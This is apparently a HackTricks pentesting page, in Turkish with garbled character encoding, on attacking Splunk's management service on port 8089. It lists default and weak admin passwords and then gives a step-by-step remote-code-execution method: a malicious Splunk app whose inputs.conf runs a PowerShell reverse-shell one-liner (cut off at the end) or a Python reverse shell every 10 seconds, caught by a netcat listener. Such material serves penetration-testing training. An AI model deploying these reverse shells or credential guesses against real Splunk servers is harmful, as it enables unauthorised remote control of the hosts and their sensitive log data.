# 8089 - Splunkd Pentesting

<details>

<summary><strong>AWS hackleme hakkÄ±nda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **Temel Bilgiler**

Splunk, **gÃ¼nlÃ¼k analiz aracÄ±** olarak kullanÄ±lan ve verileri **toplama, analiz etme ve gÃ¶rselleÅŸtirme** konusunda Ã¶nemli bir rol oynayan bir araÃ§tÄ±r. Ä°lk amacÄ± bir **SIEM (GÃ¼venlik Bilgi ve Olay YÃ¶netimi)** aracÄ± olarak hizmet vermek olmasa da, **gÃ¼venlik izleme** ve **iÅŸ analitiÄŸi** alanÄ±nda popÃ¼lerlik kazanmÄ±ÅŸtÄ±r.

Splunk daÄŸÄ±tÄ±mlarÄ± sÄ±klÄ±kla **hassas verileri** depolamak iÃ§in kullanÄ±lÄ±r ve sistemleri ele geÃ§irmeyi baÅŸarÄ±rlarsa potansiyel saldÄ±rganlar iÃ§in **deÄŸerli bir bilgi kaynaÄŸÄ±** olabilir.
**VarsayÄ±lan port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web sunucusu varsayÄ±lan olarak 8000 numaralÄ± portta Ã§alÄ±ÅŸÄ±r**.
{% endhint %}

## SÄ±ralama

### Ãœcretsiz SÃ¼rÃ¼m

Splunk Enterprise denemesi, **60 gÃ¼n sonra Ã¼cretsiz bir sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸÃ¼r** ve **kimlik doÄŸrulama gerektirmez**. Sistem yÃ¶neticilerinin Splunk'Ä± denemek iÃ§in bir deneme sÃ¼rÃ¼mÃ¼ yÃ¼klemesi ve daha sonra bunu unutmasÄ± alÄ±ÅŸÄ±lmadÄ±k bir durum deÄŸildir. Bu, ortamda bir gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturacak olan kimlik doÄŸrulamasÄ± olmayan Ã¼cretsiz sÃ¼rÃ¼me otomatik olarak dÃ¶nÃ¼ÅŸecektir. BazÄ± kuruluÅŸlar, kullanÄ±cÄ±/rol yÃ¶netiminin olmamasÄ±nÄ±n ne anlama geldiÄŸini tam olarak anlamadÄ±klarÄ± iÃ§in bÃ¼tÃ§e kÄ±sÄ±tlamalarÄ± nedeniyle Ã¼cretsiz sÃ¼rÃ¼mÃ¼ tercih edebilirler.

### VarsayÄ±lan Kimlik Bilgileri

Eski sÃ¼rÃ¼mlerde Splunk'Ä±n varsayÄ±lan kimlik bilgileri **`admin:changeme`**'dir ve bunlar giriÅŸ sayfasÄ±nda uygun bir ÅŸekilde gÃ¶rÃ¼ntÃ¼lenir.\
Ancak, **Splunk'Ä±n en son sÃ¼rÃ¼mÃ¼**, **kurulum sÃ¼reci sÄ±rasÄ±nda kimlik bilgilerini ayarlar**. VarsayÄ±lan kimlik bilgileri Ã§alÄ±ÅŸmazsa, `admin`, `Welcome`, `Welcome1`, `Password123` gibi yaygÄ±n zayÄ±f parolalarÄ± kontrol etmek faydalÄ± olabilir.

### Bilgi Edinme

Splunk'a giriÅŸ yaptÄ±ktan sonra, verileri **gezebilir**, **raporlar Ã§alÄ±ÅŸtÄ±rabilir**, **gÃ¶sterge panolarÄ± oluÅŸturabilir**, Splunkbase kÃ¼tÃ¼phanesinden **uygulamalar yÃ¼kleyebilir** ve Ã¶zel uygulamalarÄ± yÃ¼kleyebilirsiniz.\
AyrÄ±ca kod Ã§alÄ±ÅŸtÄ±rabilirsiniz: Splunk'Ä±n sunucu tarafÄ±nda Django uygulamalarÄ±, REST uÃ§ noktalarÄ±, betikli giriÅŸler ve uyarÄ± betikleri gibi **kod Ã§alÄ±ÅŸtÄ±rma yÃ¶ntemleri** bulunmaktadÄ±r. Splunk sunucusunda uzaktan kod yÃ¼rÃ¼tme elde etmenin yaygÄ±n bir yÃ¶ntemi, betikli bir giriÅŸin kullanÄ±lmasÄ±dÄ±r.

AyrÄ±ca, Splunk Windows veya Linux ana bilgisayarlarÄ±na kurulabileceÄŸinden, betikli giriÅŸler Bash, PowerShell veya Batch betiklerini Ã§alÄ±ÅŸtÄ±rmak iÃ§in oluÅŸturulabilir.

### Shodan

* `Splunk derlemesi`

## Uzaktan Kod YÃ¼rÃ¼tme (RCE)

### Ã–zel Uygulama OluÅŸturma

Ã–zel bir uygulama **Python, Batch, Bash veya PowerShell betiklerini** Ã§alÄ±ÅŸtÄ±rabilir.\
UnutmayÄ±n ki **Splunk, Python'Ä± yÃ¼klÃ¼ olarak gelir**, bu yÃ¼zden **Windows** sistemlerinde bile python kodunu Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Bize yardÄ±mcÄ± olmasÄ± iÃ§in [**bu**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paketini kullanabilirsiniz. Bu depodaki **`bin`** dizininde [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ve [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) iÃ§in Ã¶rnekler bulunmaktadÄ±r. AdÄ±m adÄ±m ilerleyelim.

Bunu baÅŸarmak iÃ§in Ã¶ncelikle aÅŸaÄŸÄ±daki dizin yapÄ±sÄ±nÄ± kullanarak Ã¶zel bir Splunk uygulamasÄ± oluÅŸturmamÄ±z gerekmektedir:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** dizini, Ã§alÄ±ÅŸtÄ±rmayÄ± planladÄ±ÄŸÄ±mÄ±z **komut dosyalarÄ±nÄ±** iÃ§erecektir (bu durumda bir **PowerShell** ters kabuk). VarsayÄ±lan dizinde ise `inputs.conf` dosyamÄ±z bulunacak. Ters kabuÄŸumuz bir **PowerShell tek satÄ±rlÄ±k** olacak:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) dosyasÄ±, Splunk'a **hangi betiÄŸin Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ±** ve diÄŸer koÅŸullarÄ± sÃ¶yler. Burada uygulamayÄ± etkinleÅŸtiriyoruz ve Splunk'a betiÄŸi her 10 saniyede bir Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± sÃ¶ylÃ¼yoruz. AralÄ±k her zaman saniye cinsinden belirtilir ve bu ayar mevcut olduÄŸunda giriÅŸ (betik) Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Uygulama daÄŸÄ±tÄ±ldÄ±ÄŸÄ±nda Ã§alÄ±ÅŸacak ve PowerShell tek satÄ±rlÄ±k komutu yÃ¼rÃ¼tecek olan `.bat` dosyasÄ±na ihtiyacÄ±mÄ±z var.

Bir sonraki adÄ±m, `Dosyadan uygulama yÃ¼kle` seÃ§eneÄŸini seÃ§mek ve uygulamayÄ± yÃ¼klemektir.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

ZararlÄ± Ã¶zel uygulamayÄ± yÃ¼klemeye baÅŸlamadan Ã¶nce, Netcat veya [socat](https://linux.die.net/man/1/socat) kullanarak bir dinleyici baÅŸlatalÄ±m.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
`Upload app` sayfasÄ±nda, `GÃ¶z at` seÃ§eneÄŸine tÄ±klayÄ±n, daha Ã¶nce oluÅŸturduÄŸumuz tarball'Ä± seÃ§in ve `YÃ¼kle`'ye tÄ±klayÄ±n. UygulamayÄ± yÃ¼klediÄŸimiz anda, uygulamanÄ±n durumu otomatik olarak `Etkin` olarak deÄŸiÅŸeceÄŸi iÃ§in bir ters kabuk alÄ±nÄ±r.

#### Linux

EÄŸer bir **Linux ana bilgisayarÄ±yla uÄŸraÅŸÄ±yorsak**, Ã¶zel kÃ¶tÃ¼ amaÃ§lÄ± uygulamayÄ± oluÅŸturmadan Ã¶nce `rev.py` Python betiÄŸini dÃ¼zenlememiz gerekecektir. Geri kalan sÃ¼reÃ§ aynÄ± olacak ve Netcat dinleyicimize ters kabuk baÄŸlantÄ±sÄ± alacaÄŸÄ±z.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE ve Yetki YÃ¼kseltme

AÅŸaÄŸÄ±daki sayfada, bu hizmetin nasÄ±l kÃ¶tÃ¼ye kullanÄ±larak yetki yÃ¼kseltme ve kalÄ±cÄ±lÄ±k elde edilebileceÄŸi aÃ§Ä±klanmaktadÄ±r:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
